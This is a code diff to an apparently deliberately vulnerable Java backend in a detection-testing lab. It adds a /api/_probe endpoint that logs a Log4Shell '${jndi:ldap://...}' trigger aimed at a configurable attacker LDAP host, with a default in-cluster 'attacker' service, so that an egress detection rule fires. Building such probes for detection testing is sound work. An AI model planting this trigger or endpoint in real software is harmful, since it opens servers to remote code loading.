@@ -33,6 +33,15 @@ import java.util.regex.Pattern;
  *
  * Postgres connection comes from env (POSTGRES_HOST, POSTGRES_DB, POSTGRES_USER),
  * trust auth (empty password) — same as the deploy manifests.
+ *
+ * Where the malicious LDAP referral server lives — the endpoint the Log4Shell
+ * JNDI lookup dials out to — is env-driven so the same image runs anywhere
+ * (mirrors the attacker image's CODEBASE_HOST/CODEBASE_URL, see PR #144):
+ *   LDAP_URL   full override, e.g. ldap://1.2.3.4:1389/Probe
+ *   LDAP_HOST  just host[:port] (default: the in-cluster attacker Service)
+ * A non-private/public LDAP_HOST is what makes the backend's call-out egress
+ * non-private, so R0011 (unexpected egress) fires — the network side of the
+ * chain. The /api/_probe endpoint fires this lookup on demand.
  */
 public class App {
     private static final Logger log = LogManager.getLogger(App.class);
@@ -42,7 +51,16 @@ public class App {
     private static final String PG_USER = env("POSTGRES_USER", "postgres");
     private static final String PG_URL  = "jdbc:postgresql://" + PG_HOST + ":5432/" + PG_DB;
 
+    /** LDAP referral endpoint the JNDI lookup dials. LDAP_URL wins; else built from LDAP_HOST. */
+    private static final String LDAP_URL = ldapUrl();
+
     static String env(String k, String d) { String v = System.getenv(k); return (v == null || v.isEmpty()) ? d : v; }
+
+    static String ldapUrl() {
+        String url = System.getenv("LDAP_URL");
+        if (url != null && !url.isEmpty()) return url;
+        return "ldap://" + env("LDAP_HOST", "attacker.attacker-ns.svc.cluster.local:1389") + "/Probe";
+    }
 
     static Connection conn() throws SQLException { return DriverManager.getConnection(PG_URL, PG_USER, ""); }
 
@@ -54,10 +72,29 @@ public class App {
         s.createContext("/api/cart",     new CartHandler());
         s.createContext("/api/checkout", new CheckoutHandler());
         s.createContext("/api/orders",   new OrdersHandler());
+        s.createContext("/api/_probe",   new ProbeHandler());
         s.createContext("/healthz",      ex -> respond(ex, 200, "{\"status\":\"ok\"}"));
         s.setExecutor(Executors.newFixedThreadPool(8));
         s.start();
-        log.info("chain-backend started on port {} (db={})", port, PG_URL);
+        log.info("chain-backend started on port {} (db={}, ldap={})", port, PG_URL, LDAP_URL);
+    }
+
+    // ─────────────────── /api/_probe (configurable Log4Shell self-probe) ───────────────────
+    /**
+     * Fires the JNDI trigger at the configured LDAP endpoint through the SAME
+     * vulnerable log4j line as ProductHandler. Lets a caller trip one
+     * deterministic, off-profile LDAP egress (a falsifiability probe) without a
+     * separate attack pod — the destination is wherever LDAP_URL/LDAP_HOST points,
+     * so it pairs with the attacker image's public CODEBASE_HOST (PR #144) to
+     * exercise the network side (R0011). On a patched build the string is logged
+     * literally and no lookup happens. Normal traffic never hits this path.
+     */
+    static class ProbeHandler implements HttpHandler {
+        public void handle(HttpExchange ex) throws IOException {
+            String trigger = "${jndi:" + LDAP_URL + "}";
+            log.info("self-probe q={} ua={}", "probe", trigger);
+            respond(ex, 200, "{\"probe\":\"" + esc(LDAP_URL) + "\"}");
+        }
     }
 
     // ───────────────────────── helpers ─────────────────────────
